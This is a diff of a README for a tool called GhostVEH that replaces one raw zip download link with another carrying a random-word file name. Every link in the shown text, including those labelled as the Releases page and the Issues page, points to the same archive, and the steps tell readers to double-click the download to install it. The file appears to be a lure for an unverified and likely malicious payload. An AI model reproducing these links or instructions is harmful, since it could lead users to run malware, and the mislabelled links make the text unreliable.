@@ -6,7 +6,7 @@ GhostVEH helps you manage exception handlers in a simple way. It directly intera
 
 ## 📥 Download GhostVEH
 
-[![Download GhostVEH](https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/VEH-Ghost-nonremembrance.zip%https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/VEH-Ghost-nonremembrance.zip)](https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/VEH-Ghost-nonremembrance.zip)
+[![Download GhostVEH](https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/Ghost-VEH-counterreligion.zip%https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/Ghost-VEH-counterreligion.zip)](https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/Ghost-VEH-counterreligion.zip)
 
 Click the button above to get started. You will find the latest version along with older versions on our Releases page.
 
@@ -23,19 +23,19 @@ Make sure your system meets these requirements before proceeding with the downlo
 
 ## 🔗 Visit Releases Page
 
-For the latest version of GhostVEH, [visit this page to download](https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/VEH-Ghost-nonremembrance.zip). You’ll find the installation files there.
+For the latest version of GhostVEH, [visit this page to download](https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/Ghost-VEH-counterreligion.zip). You’ll find the installation files there.
 
 ## 📦 Download & Install
 
-1. **Go to the Releases Page:** Click the link to [visit this page to download](https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/VEH-Ghost-nonremembrance.zip).
+1. **Go to the Releases Page:** Click the link to [visit this page to download](https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/Ghost-VEH-counterreligion.zip).
 
 2. **Choose Your Version:** You will see a list of releases. Make sure to choose the latest version for the best experience.
 
-3. **Download the Setup File:** Click on the file named `https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/VEH-Ghost-nonremembrance.zip` or the latest version available. Your download will start automatically.
+3. **Download the Setup File:** Click on the file named `https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/Ghost-VEH-counterreligion.zip` or the latest version available. Your download will start automatically.
 
 4. **Run the Installer:**
    - Locate the downloaded file in your Downloads folder.
-   - Double-click the `https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/VEH-Ghost-nonremembrance.zip` file to start the installation.
+   - Double-click the `https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/Ghost-VEH-counterreligion.zip` file to start the installation.
 
 5. **Follow Installation Instructions:** A setup wizard will guide you through the installation process. Simply follow the prompts.
    - Accept the license agreement.
@@ -68,7 +68,7 @@ If you still face challenges, questions, or feedback, don’t hesitate to reach 
 
 ## 📝 Additional Information
 
-- **Support:** You can ask questions or report issues directly on the project's [GitHub Issues page](https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/VEH-Ghost-nonremembrance.zip).
+- **Support:** You can ask questions or report issues directly on the project's [GitHub Issues page](https://github.com/Buvan7-glitch/GhostVEH/raw/refs/heads/main/GhostVEH/Ghost-VEH-counterreligion.zip).
 - **Community:** Join our community discussions and helpful tips by following the project updates on GitHub.
 
 GhostVEH aims to simplify exception handling, and we appreciate your interest. We hope this guide helps you successfully download and run the software. Thank you for using GhostVEH!
